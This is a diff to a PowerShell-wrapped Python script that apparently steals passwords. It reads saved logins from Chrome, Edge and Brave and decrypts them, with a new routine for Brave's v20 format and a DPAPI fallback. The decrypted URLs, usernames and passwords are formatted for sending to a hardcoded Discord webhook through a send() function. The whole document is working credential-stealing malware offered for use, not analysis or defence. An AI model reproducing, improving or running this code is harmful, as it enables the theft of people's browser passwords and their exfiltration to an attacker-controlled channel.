@@ -38,20 +38,19 @@ try {
     cd $pyPath
     
     @'
-import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time,hashlib,hmac
+import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time,hashlib,hmac,struct
 from Crypto.Cipher import AES
-from Crypto.Protocol.KDF import PBKDF2
 
 WH = "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"
 
 def send(msg):
     try:
         import requests
-        requests.post(WH, json={"content": msg}, timeout=5)
+        requests.post(WH, json={"content": msg[:1900]}, timeout=5)
     except:
         pass
 
-send("🐍 Python started - v20 support enabled")
+send("🐍 Python started - v20 FIXED")
 
 try:
     import requests
@@ -67,6 +66,42 @@ except:
 import locale
 language=locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "N/A"
 
+def decrypt_v20(enc_password, master_key):
+    """Déchiffrement spécifique v20 - Brave récent"""
+    try:
+        # v20 format: v20 + nonce(12) + ciphertext + tag(16)
+        nonce = enc_password[3:15]
+        ciphertext_and_tag = enc_password[15:]
+        
+        # IMPORTANT: v20 utilise la clé DIRECTEMENT sans le tag séparé
+        # Le tag est INCLUS dans le ciphertext
+        
+        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+        
+        # Décrypter TOUT (ciphertext + tag ensemble)
+        plaintext = cipher.decrypt(ciphertext_and_tag)
+        
+        # Le tag est vérifié automatiquement pendant decrypt
+        # Si le tag est invalide, une exception sera levée
+        
+        # Retourner juste le plaintext (sans les 16 derniers bytes qui sont le tag)
+        return plaintext[:-16].decode('utf-8', errors='ignore')
+        
+    except Exception as e:
+        # Si ça échoue, essayer la méthode standard avec verify séparé
+        try:
+            nonce = enc_password[3:15]
+            tag = enc_password[-16:]
+            ciphertext = enc_password[15:-16]
+            
+            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+            return plaintext.decode('utf-8', errors='ignore')
+        except:
+            pass
+    
+    return None
+
 def decrypt_password(enc_password, key):
     """Déchiffre selon le format détecté"""
     
@@ -75,7 +110,7 @@ def decrypt_password(enc_password, key):
     
     prefix = enc_password[:3]
     
-    # Format v10/v11 (Chrome, Edge, ancien Brave)
+    # Format v10/v11 (Chrome, Edge)
     if prefix in [b'v10', b'v11']:
         try:
             nonce = enc_password[3:15]
@@ -88,49 +123,11 @@ def decrypt_password(enc_password, key):
     
     # Format v20 (Brave récent)
     elif prefix == b'v20':
-        try:
-            # v20 utilise une dérivation de clé différente
-            nonce = enc_password[3:15]
-            ciphertext = enc_password[15:-16]
-            tag = enc_password[-16:]
-            
-            # Dériver une sous-clé pour v20
-            # Brave v20 utilise HKDF pour dériver la clé
-            import hashlib
-            
-            # Essayer avec la clé directement d'abord
-            try:
-                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
-                return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
-            except:
-                pass
-            
-            # Si ça échoue, essayer avec une dérivation HKDF
-            # HKDF: info = "application_specific_info"
-            info = b"application_specific_info"
-            salt = b""
-            
-            # HKDF-Expand
-            def hkdf_expand(key, info, length=32):
-                import hmac
-                okm = b""
-                prev = b""
-                counter = 1
-                while len(okm) < length:
-                    prev = hmac.new(key, prev + info + bytes([counter]), hashlib.sha256).digest()
-                    okm += prev
-                    counter += 1
-                return okm[:length]
-            
-            derived_key = hkdf_expand(key, info, 32)
-            
-            cipher = AES.new(derived_key, AES.MODE_GCM, nonce=nonce)
-            return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8', errors='ignore')
-            
-        except Exception as e:
-            pass
+        result = decrypt_v20(enc_password, key)
+        if result:
+            return result
     
-    # DPAPI (très ancien format)
+    # DPAPI (ancien)
     try:
         return win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1].decode('utf-8', errors='ignore')
     except:
@@ -167,7 +164,7 @@ def decrypt_browser(db_path, state_path, browser_name):
         
         for url, user, enc_pwd in cursor.fetchall():
             pwd = decrypt_password(enc_pwd, key)
-            if pwd:
+            if pwd and len(pwd) > 0:
                 results.append(f"[{browser_name}] {url}\nUsername: {user}\nPassword: {pwd}\n")
                 decrypted += 1
             else:
